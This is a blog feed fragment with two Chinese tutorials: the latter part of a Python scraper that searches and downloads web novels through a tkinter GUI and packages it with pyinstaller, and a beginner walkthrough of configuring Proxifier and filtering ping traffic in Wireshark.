class="code"><pre><span class="line"><span class="comment"># 按照小说目录下载整本小说</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> novel1</span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_novel</span>(<span class="params">url</span>):   </span><br><span class="line">    <span class="comment"># url=&#x27;http://www.yetianlian.cc/yt78909/&#x27;</span></span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到标题</span></span><br><span class="line">    name=tree.xpath(<span class="string">&#x27;//h2/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 拿到各章地址</span></span><br><span class="line">    url_list=tree.xpath(<span class="string">&#x27;//div[@class=&quot;listmain&quot;]//a/@href&#x27;</span>)</span><br><span class="line">    url_list=url_list[<span class="number">12</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;下载小说：&#x27;</span>+name)</span><br><span class="line">    <span class="keyword">for</span> base_url <span class="keyword">in</span> url_list:</span><br><span class="line">        url=<span class="string">&#x27;http://www.yetianlian.cc&#x27;</span>+base_url</span><br><span class="line">        novel1.download_chapters(url=url,name=name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用xpath获取小说的名称和各章的地址</p><p>5，搜索功能，创建novel3.py，封装一个获取小说名称，调用网站的搜索接口，返回搜索结果的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索功能</span></span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> prettytable <span class="keyword">as</span> pt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">novel_name</span>):</span><br><span class="line">    url=<span class="string">&#x27;http://www.yetianlian.cc/s.php?ie=utf-8&amp;q=&#x27;</span></span><br><span class="line">    url=url+quote(novel_name)</span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到搜索内容</span></span><br><span class="line">    <span class="comment"># 小说地址</span></span><br><span class="line">    address_list=tree.xpath(<span class="string">&#x27;//h4[@class=&quot;bookname&quot;]/a/@href&#x27;</span>)</span><br><span class="line">    <span class="comment"># 小说名称</span></span><br><span class="line">    names_list=tree.xpath(<span class="string">&#x27;//h4[@class=&quot;bookname&quot;]/a/text()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 小说作者</span></span><br><span class="line">    authors_list=tree.xpath(<span class="string">&#x27;//div[@class=&quot;author&quot;]/text()&#x27;</span>)</span><br><span class="line">    authors_list=[item.replace(<span class="string">&#x27;作者：&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> authors_list]</span><br><span class="line">    <span class="comment"># 设置列表</span></span><br><span class="line">    novels_info=[]</span><br><span class="line">    <span class="comment"># 创建好看的表格</span></span><br><span class="line">    tb=pt.PrettyTable()</span><br><span class="line">    tb.field_names=[<span class="string">&#x27;序号&#x27;</span>,<span class="string">&#x27;书名&#x27;</span>,<span class="string">&#x27;作者&#x27;</span>,<span class="string">&#x27;下载地址&#x27;</span>]</span><br><span class="line">    num=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(names_list)):</span><br><span class="line">        info=&#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>:names_list[i],</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span>:authors_list[i],</span><br><span class="line">            <span class="string">&#x27;address&#x27;</span>:address_list[i]</span><br><span class="line">        &#125;</span><br><span class="line">        tb.add_row([num,names_list[i],authors_list[i],address_list[i]])</span><br><span class="line">        novels_info.append(info)</span><br><span class="line">    <span class="built_in">print</span>(tb)</span><br><span class="line">    <span class="keyword">return</span> novels_info</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，用xpath获取网站的搜索结果包括小说的名称，作者和下载地址，prettytable是整齐好看的表格，让结果整齐的在控制台中打印出来</p><p>6，GUI图形化窗口，创建novel4.py，封装一个创建图形化窗口的方法，该窗口中包括两个标签（名称&#x2F;作者，序号）和与之对应的输入框和按钮和一个表格，表格分为序号，书名，作者和下载地址四列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图形主页面</span></span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> ttk</span><br><span class="line"><span class="keyword">import</span> novel5</span><br><span class="line"><span class="comment"># 创建窗口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_window</span>():</span><br><span class="line">    root=tk.Tk()</span><br><span class="line">    <span class="comment"># 设置窗口标题</span></span><br><span class="line">    root.title(<span class="string">&#x27;小说下载器&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置窗口的大小（长400px，宽300px）</span></span><br><span class="line">    root.geometry(<span class="string">&quot;500x400&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取屏幕的宽度和高度</span></span><br><span class="line">    screen_width = root.winfo_screenwidth()</span><br><span class="line">    screen_height = root.winfo_screenheight()</span><br><span class="line">    <span class="comment"># 计算窗口在屏幕上的位置（居中）</span></span><br><span class="line">    x_pos = <span class="built_in">int</span>((screen_width / <span class="number">2</span>) - (<span class="number">500</span> / <span class="number">2</span>))</span><br><span class="line">    y_pos = <span class="built_in">int</span>((screen_height / <span class="number">2</span>) - (<span class="number">400</span> / <span class="number">2</span>))</span><br><span class="line">    <span class="comment"># 使用geometry()函数设置窗口的位置和大小</span></span><br><span class="line">    root.geometry(<span class="string">&quot;+&#123;&#125;+&#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_pos, y_pos))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个书名的标签</span></span><br><span class="line">    lable_shuming=tk.Frame(root)</span><br><span class="line">    lable_shuming.pack(pady=<span class="number">15</span>,fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    lab_shum=tk.Label(lable_shuming,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">15</span>),text=<span class="string">&#x27;书名/作者&#x27;</span>)</span><br><span class="line">    lab_shum.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置书名/作者输入框的变量</span></span><br><span class="line">    name_var=tk.StringVar()</span><br><span class="line">    ent_shuming=tk.Entry(lable_shuming,relief=<span class="string">&#x27;flat&#x27;</span>,textvariable=name_var)</span><br><span class="line">    ent_shuming.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    btn_shuming=tk.Button(lable_shuming,command=<span class="keyword">lambda</span>:novel5.sosuo(name_var,tree_view),text=<span class="string">&#x27;搜索&#x27;</span>,bg=<span class="string">&#x27;#00BFFF&#x27;</span>,fg=<span class="string">&#x27;#FFFFFF&#x27;</span>,width=<span class="number">4</span>,height=<span class="number">1</span>,activebackground=<span class="string">&#x27;#00BFFF&#x27;</span>,activeforeground=<span class="string">&#x27;#00BFFF&#x27;</span>,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">11</span>))</span><br><span class="line">    btn_shuming.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个选择序号的标签</span></span><br><span class="line">    lable_number=tk.Frame(root)</span><br><span class="line">    lable_number.pack(pady=<span class="number">5</span>,fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    lab_num=tk.Label(lable_number,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">15</span>),text=<span class="string">&#x27; 选择序号&#x27;</span>)</span><br><span class="line">    lab_num.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置序号输入框的变量</span></span><br><span class="line">    num_var=tk.StringVar()</span><br><span class="line">    ent_number=tk.Entry(lable_number,relief=<span class="string">&#x27;flat&#x27;</span>,textvariable=num_var)</span><br><span class="line">    ent_number.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    btn_number=tk.Button(lable_number,command=<span class="keyword">lambda</span>:novel5.down(num_var,root),text=<span class="string">&#x27;下载&#x27;</span>,bg=<span class="string">&#x27;#00BFFF&#x27;</span>,fg=<span class="string">&#x27;#FFFFFF&#x27;</span>,width=<span class="number">4</span>,height=<span class="number">1</span>,activebackground=<span class="string">&#x27;#00BFFF&#x27;</span>,activeforeground=<span class="string">&#x27;#00BFFF&#x27;</span>,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">11</span>))</span><br><span class="line">    btn_number.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置搜索显示表</span></span><br><span class="line">    columns=(<span class="string">&#x27;novle_id&#x27;</span>,<span class="string">&#x27;novle_name&#x27;</span>,<span class="string">&#x27;novle_author&#x27;</span>,<span class="string">&#x27;novle_address&#x27;</span>)</span><br><span class="line">    tree_view=ttk.Treeview(root,height=<span class="number">18</span>,columns=columns,show=<span class="string">&#x27;headings&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置每列格式</span></span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_id&#x27;</span>,width=<span class="number">25</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_name&#x27;</span>,width=<span class="number">55</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_author&#x27;</span>,width=<span class="number">40</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_address&#x27;</span>,width=<span class="number">40</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置每列表头</span></span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_id&#x27;</span>,text=<span class="string">&#x27;序号&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_name&#x27;</span>,text=<span class="string">&#x27;书名&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_author&#x27;</span>,text=<span class="string">&#x27;作者&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_address&#x27;</span>,text=<span class="string">&#x27;下载地址&#x27;</span>)</span><br><span class="line">    tree_view.pack(side=<span class="string">&#x27;left&#x27;</span>,fill=<span class="string">&#x27;both&#x27;</span>,expand=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击按钮后，将输入框的值发送给novel5执行</p><p>7，主方法，创建novel5.py，在该方法中将之前的功能串联起来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主方法</span></span><br><span class="line"><span class="keyword">import</span> novel4</span><br><span class="line"><span class="keyword">import</span> novel3</span><br><span class="line"><span class="keyword">import</span> novel2</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    root=novel4.get_window()</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击搜索</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sosuo</span>(<span class="params">name_var,tree_view</span>):</span><br><span class="line">    name=name_var.get()</span><br><span class="line">    <span class="keyword">global</span> novels_info</span><br><span class="line">    novels_info=novel3.search(name)</span><br><span class="line">    <span class="comment"># 插入novels_info中的数据</span></span><br><span class="line">    <span class="keyword">for</span> i, novel_info <span class="keyword">in</span> <span class="built_in">enumerate</span>(novels_info):</span><br><span class="line">        values = [i, novel_info[<span class="string">&#x27;name&#x27;</span>], novel_info[<span class="string">&#x27;author&#x27;</span>], novel_info[<span class="string">&#x27;address&#x27;</span>]]</span><br><span class="line">        tree_view.insert(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, values=values)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 在主窗口上弹出新窗口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_new_window</span>(<span class="params">message,root</span>):</span><br><span class="line">    new_window = tk.Toplevel(root)</span><br><span class="line">    new_window.title(<span class="string">&quot;小说下载器&quot;</span>)</span><br><span class="line">    new_window.geometry(<span class="string">&quot;350x100+650+400&quot;</span>)</span><br><span class="line">    label = tk.Label(new_window, text=message)</span><br><span class="line">    label.pack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击下载</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>(<span class="params">num_var,root</span>):</span><br><span class="line">    num=<span class="built_in">int</span>(num_var.get())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> num&lt;<span class="number">0</span> <span class="keyword">or</span> num&gt;<span class="built_in">len</span>(novels_info):</span><br><span class="line">            message=<span class="string">&#x27;输入的序号错误！&#x27;</span></span><br><span class="line">            open_new_window(message,root)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            address = <span class="string">&#x27;http://www.yetianlian.cc&#x27;</span>+novels_info[num][<span class="string">&#x27;address&#x27;</span>]</span><br><span class="line">            novel2.get_novel(address)</span><br><span class="line">            message=<span class="string">&#x27;下载完成！\n 小说下载到：&#x27;</span>+path</span><br><span class="line">            open_new_window(message,root)     </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        message=<span class="string">&#x27;下载失败！&#x27;</span></span><br><span class="line">        open_new_window(message,root)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>8,运行效果</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082114588.png" alt="image-20231208204704551" style="zoom:67%;" /><p>搜索功能：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082115144.png" alt="image-20231208204802038" style="zoom:67%;" /><p>下载功能：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082115654.png" alt="image-20231208205131466" style="zoom:67%;" /><p>下载的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082116465.png" alt="image-20231208205206240"></p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082116076.png" alt="image-20231208205230920" style="zoom:67%;" /><p>9，打包为exe可执行文件<br>cmd 进入项目的文件夹内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -D -w -i box.ico -n &quot;小说下载器&quot; novel5.py</span><br><span class="line">-D表示打包为文件夹</span><br><span class="line">-w表示可在Windows系统中使用</span><br><span class="line">-i box.ico表示选择当前文件夹下的box.ico图片当做程序的图标</span><br><span class="line">-n &quot;小说下载器&quot; 表示程序的名称为：小说下载器</span><br><span class="line">novel5.py该项目的主程序入口</span><br></pre></td></tr></table></figure><p>打包完成为：build,dist两个文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082117103.png" alt="image-20231208205911547"></p><p>其中exe程序就在dist的文件夹下</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082118594.png" alt="image-20231208210019441"></p><p>至此，整个python爬虫的小说下载器项目就制作完成！</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		用python爬虫制作一个爬取笔趣阁网站小说并且下载的程序，以下是 详细步骤：&lt;/p&gt;
&lt;p&gt;1，先下载该程序所需的库：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十四，Proxifier和Wireshark的使用</title>
    <link href="http://example.com/2023/12/05/%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%8CProxifier%E5%92%8CWireshark%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/12/05/%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%8CProxifier%E5%92%8CWireshark%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-12-05T11:23:38.000Z</published>
    <updated>2023-12-05T12:09:31.262Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一，Proxifier的使用"><a href="#一，Proxifier的使用" class="headerlink" title="一，Proxifier的使用"></a>一，Proxifier的使用</h4><p>​Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p><p>1，下载安装Proxifier，官网地址为：<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051933548.png" alt="image-20231205193345581" style="zoom: 80%;" /><p>2，双击运行Proxifier</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051936640.png" alt="image-20231205193621432"></p><p>3，点击配置文件—&gt;点击代理服务器—&gt;点击添加—&gt;地址填127.0.0.1—&gt;端口填自己代理的端口—&gt;选中SOCKES 版本 5—&gt;点击确定—&gt;点击确定</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051940358.png" alt="image-20231205194010239"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051941649.png" alt="image-20231205194102379"></p><p>4，点击配置文件—&gt;点击代理规则—&gt;点击添加—&gt;名称随意填—&gt;应用程序填想要添加代理的程序或服务，例如：ssh*;—&gt;点击确定—&gt;移除Location—&gt;将Default的最后一格改为Direct—&gt;点击确定</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051944093.png" alt="image-20231205194430704"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051946528.png" alt="image-20231205194615312"></p><p>5，打开命令提示符，输入：ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;</a>，返回Proxifier出现以下效果，说明代理成功</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051950439.png" alt="image-20231205195024403"></p><h4 id="二，Wireshark的使用"><a href="#二，Wireshark的使用" class="headerlink" title="二，Wireshark的使用"></a>二，Wireshark的使用</h4><p>​WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位。</p><p>1，下载WireShark，官网地址为：<a href="https://www.wireshark.org/">https://www.wireshark.org/</a></p><p>下载时能勾上下载的插件全部都要勾上下载下来，包括其中的Npcap和USBPcap组件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051956891.png" alt="image-20231205195616935"></p><p>2，找到本机的网卡并双击选择</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051958979.png" alt="image-20231205195830437"></p><p>3，打开命令提示符，输入ping 192.168.2.56,发送和接收四个数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052000693.png" alt="image-20231205200010210"></p><p>4，在WireShark中点击停止，停止监控数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052001054.png" alt="image-20231205200123126"></p><p>5，在搜索框中输入icmp，查看ping的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052002568.png" alt="image-20231205200251634"></p><p>6.，在搜索框中输入ip.src&#x3D;&#x3D;192.168.2.96则可以查看源地址为192.168.2.96的数据包</p><p>输入ip.dst&#x3D;&#x3D;192.168.2.56则可以查看目标地址为192.168.2.56的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052008367.png" alt="image-20231205200848249"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一，Proxifier的使用&quot;&gt;&lt;a href=&quot;#一，Proxifier的使用&quot; class=&quot;headerlink&quot; title=&quot;一，Proxifier的使用&quot;&gt;&lt;/a&gt;一，Proxifier的使用&lt;/h4&gt;&lt;p&gt;​		Proxifier是一款功能非常强大的</summary>
      
    
    
    
    
  </entry>
  
</feed>
